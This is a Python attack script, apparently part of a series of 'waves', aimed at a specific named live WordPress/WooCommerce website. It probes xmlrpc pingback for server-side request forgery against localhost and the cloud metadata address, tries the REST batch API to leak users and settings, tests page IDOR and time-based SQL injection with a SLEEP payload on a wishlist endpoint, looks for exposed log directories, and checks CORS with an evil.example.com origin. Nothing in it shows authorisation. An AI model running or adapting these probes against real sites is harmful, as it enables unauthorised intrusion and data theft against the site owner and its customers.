#!/usr/bin/env python3
"""Wave9: pingback SSRF detail, REST batch, IDOR pages, wishlist populate, paths."""
from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

R = {"ts": time.time(), "confirmed": [], "leads": [], "probes": {}}


def http(method, url, data=None, headers=None, timeout=35):
    h = {"User-Agent": "Mozilla/5.0 lurksek-wave9", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


# nonce
code, _, body, _ = http("GET", TARGET + "/")
html = body.decode("utf-8", "replace")
nonces = re.findall(r'"nonce"\s*:\s*"([a-f0-9]{8,12})"', html)
nonce = nonces[0] if nonces else "54b96dfe24"
R["nonce"] = nonce

# 1) pingback - multiple sources, parse fault
for src in [
    "http://127.0.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://example.com/",
    "https://httpbin.org/get",
]:
    xml = (
        '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName>'
        f"<params><param><value><string>{src}</string></value></param>"
        f"<param><value><string>{TARGET}/</string></value></param></params></methodCall>"
    ).encode()
    c, t, b, _ = http("POST", TARGET + "/xmlrpc.php", data=xml, headers={"Content-Type": "text/xml"})
    txt = b.decode("utf-8", "replace")
    fc = re.search(r"faultCode.*?<int>(-?\d+)</int>", txt, re.S)
    fs = re.search(r"faultString.*?<string>([^<]*)</string>", txt, re.S)
    entry = {
        "code": c,
        "faultCode": fc.group(1) if fc else None,
        "faultString": fs.group(1) if fs else None,
        "body": txt[:500],
    }
    R["probes"]["pingback_" + src] = entry
    print("PING", src, c, entry["faultCode"], (entry["faultString"] or "")[:60])
    if fs and fs.group(1).strip() and "does not link" not in fs.group(1).lower():
        R["leads"].append({"type": "pingback", "src": src, "fault": fs.group(1)[:200]})

# 2) REST batch API
batch = json.dumps(
    {
        "requests": [
            {"path": "/wp/v2/users"},
            {"path": "/wp/v2/settings"},
            {"path": "/wp/v2/media?per_page=1"},
        ]
    }
).encode()
c, t, b, hdrs = http(
    "POST",
    TARGET + "/wp-json/batch/v1",
    data=batch,
    headers={"Content-Type": "application/json", "X-WP-Nonce": nonce, "Accept": "application/json"},
)
txt = b.decode("utf-8", "replace")
R["probes"]["batch"] = {"code": c, "body": txt[:600]}
print("BATCH", c, txt[:120])
if c == 200 and "settings" in txt and "rest_forbidden" not in txt.lower():
    R["confirmed"].append({"type": "rest_batch_settings_leak", "body": txt[:800]})

# 3) Page IDOR / private slug probe
for pid in [1, 2, 9139, 6130, 100]:
    c, t, b, _ = http("GET", f"{TARGET}/wp-json/wp/v2/pages/{pid}?context=edit")
    txt = b[:300].decode("utf-8", "replace")
    if c == 200 and "rest_forbidden" not in txt:
        print("PAGE IDOR?", pid, txt[:80])
        if "content" in txt or "password" in txt.lower():
            R["leads"].append({"type": "page_idor", "id": pid, "body": txt[:500]})

# 4) Wishlist populate via homepage form
boundary = "----W9" + uuid.uuid4().hex[:8]
parts = []
for k, v in [
    ("tinv_wishlist_id", ""),
    ("product_id", "6130"),
    ("product_action", "addto"),
]:
    parts.append(
        f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
    )
parts.append(f"--{boundary}--\r\n".encode())
c, t, b, _ = http(
    "POST",
    TARGET + "/",
    data=b"".join(parts),
    headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    },
)
txt = b.decode("utf-8", "replace")
R["probes"]["wishlist_addto"] = {"code": c, "body": txt[:400]}
print("WISHLIST", c, txt[:100])
m = re.search(r"share_key[\"']?\s*[:=]\s*[\"']([a-f0-9]{6})", txt, re.I)
if m:
    share = m.group(1)
    R["leads"].append({"type": "new_share_key", "share": share})
    # quick SQLi ASC vs SLEEP
    suite = []
    for lab, order in [("ASC", "ASC"), ("S5", ",(SELECT SLEEP(5))--")]:
        q = urllib.parse.urlencode({"order": order})
        c2, t2, b2, _ = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/{share}/get_products?{q}")
        suite.append({"lab": lab, "code": c2, "time": round(t2, 3)})
    R["probes"]["sqli_quick"] = suite
    print("SQLI", suite)

# 5) Sensitive paths (sparse)
for p in [
    "/wp-content/uploads/wc-logs/",
    "/wp-content/mu-plugins/",
    "/wp-sitemap.xml",
    "/wp-json/wp/v2/search?search=password",
]:
    c, t, b, _ = http("GET", TARGET + p, timeout=20)
    if c == 200 and len(b) > 50:
        txt = b[:200].decode("utf-8", "replace")
        print("PATH", p, c, len(b), txt[:60])
        if "Index of" in txt or ("password" in txt.lower() and p.endswith("search?search=password")):
            R["leads"].append({"type": "path", "path": p, "snip": txt[:200]})

# 6) CORS on settings (unauth baseline)
c, t, b, hdrs = http(
    "GET",
    TARGET + "/wp-json/wp/v2/settings",
    headers={"Origin": "https://evil.example.com", "Accept": "application/json"},
)
acao = hdrs.get("Access-Control-Allow-Origin") or hdrs.get("access-control-allow-origin")
R["probes"]["cors_settings"] = {"code": c, "acao": acao, "body": b[:200].decode("utf-8", "replace")}

for p in (OUT / "hunt_wave9.json", Path("out/hunt_wave9.json")):
    p.write_text(json.dumps(R, indent=2, default=str))
print("DONE confirmed", len(R["confirmed"]), "leads", len(R["leads"]))
